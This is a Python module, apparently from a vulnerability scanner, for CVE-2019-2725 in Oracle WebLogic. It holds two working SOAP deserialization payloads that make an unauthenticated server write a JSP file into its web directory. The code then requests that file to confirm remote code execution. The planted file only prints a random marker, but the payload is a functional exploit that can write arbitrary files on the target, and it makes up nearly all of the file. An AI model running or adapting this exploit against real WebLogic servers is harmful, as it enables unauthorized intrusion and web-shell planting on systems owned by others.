#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool.md5 import random_md5
from time import sleep

cve_2019_2725_payloads = [
    {
        'path-1': '_async/AsyncResponseService',
        'data-1': '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"><soapenv:Header><wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java version="1.8.0_131" class="java.beans.xmlDecoder"><object class="java.io.PrintWriter"><string>servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/{FILENAME}.jsp</string><void method="println"><string><![CDATA[
<% out.println("<h1>{RCEMD}</h1>"); %>]]>
</string></void><void method="close"/></object></java></work:WorkContext></soapenv:Header><soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>''',
        'path-2': '_async/{FILENAME}.jsp'
    },
        {
        'path-1': 'AsyncResponseService',
        'data-1': '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService"><soapenv:Header><wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java version="1.8.0_131" class="java.beans.xmlDecoder"><object class="java.io.PrintWriter"><string>servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/{FILENAME}.jsp</string><void method="println"><string><![CDATA[
<% out.println("<h1>{RCEMD}</h1>"); %>]]>
</string></void><void method="close"/></object></java></work:WorkContext></soapenv:Header><soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>''',
        'path-2': '{FILENAME}.jsp',
    },
]

def cve_2019_2725_scan(clients):
    ''' Weblogic 
            部分版本WebLogic中默认包含的wls9_async_response包, 为WebLogicServer提供异步通讯服务
            由于该WAR包在反序列化处理输入信息时存在缺陷, 在未授权的情况下可以远程执行命令
    '''
    client = clients.get('reqClient')

    vul_info = {
        'app_name': 'Weblogic',
        'vul_type': 'unSerialization',
        'vul_id': 'CVE-2019-2725',
    }

    headers = {
        'Content-Type': 'text/xml'
    }

    for payload in cve_2019_2725_payloads:
        randomFileName = random_md5()
        randomStr = random_md5()
        
        path_1 = payload['path-1']
        data_1 = payload['data-1'].format(FILENAME=randomFileName, RCEMD=randomStr)
        path_2 = payload['path-2'].format(FILENAME=randomFileName)

        res1 = client.request(
            'post',
            path_1,
            data=data_1,
            headers=headers,
            allow_redirects=False,
            vul_info=vul_info
        )
        if res1 is None:
            continue

        sleep(3)                    # * 延时, 因为命令执行生成文件可能有延迟, 要等一会判断结果才准确

        res2 = client.request(
            'get',
            path_2,
            allow_redirects=False,
            vul_info=vul_info
        )
        if res2 is None:
            continue

        if ((res2.status_code == 200) and (randomStr in res2.text)):
            results = {
                'Target': res1.request.url,
                'Verify': res2.request.url,
                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                'Request-1': res1,
                'Request-2': res2,
            }
            return results
    return None
